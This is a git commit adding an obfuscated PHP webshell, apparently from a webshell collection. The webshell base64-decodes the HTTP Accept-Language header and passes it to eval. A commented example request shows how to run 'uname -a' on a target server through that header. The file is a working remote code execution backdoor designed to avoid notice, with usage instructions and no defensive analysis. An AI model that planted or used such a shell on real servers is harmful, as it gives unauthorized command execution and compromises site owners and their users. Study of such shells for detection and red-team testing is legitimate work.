10c07e6f66d021d146386c011e06efc6cca1fe06
Jean-Francois-C <61638766+Jean-Francois-C@users.noreply.github.com>
2024-01-05 01:27:48 +0100

    Create

---
+++ webshells/PHP/obfuscatedsimplecmd1.php
@@ -0,0 +1,17 @@
+<?php $__=$_SERVER['HTTP_ACCEPT_LANGUAGE']; eval(base64_decode($__)); ?>
+
+/*
+Usage: Example of an HTTP GET request to send to execute the OS command 'uname -a' by adding in the request HTTP header "Accept-Language" 
+the base64 encoded version of the string: system('uname -a');
+
+GET /path/to/simpleobfuscatedcmd.php HTTP/1.1
+Host: 192.168.1.101
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: c3lzdGVtKCd1bmFtZSAtYScpOw==
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Cookie: PHPSESSID=gvhqh525l9eledr0ioknuku335;
+Upgrade-Insecure-Requests: 1
+
+/*
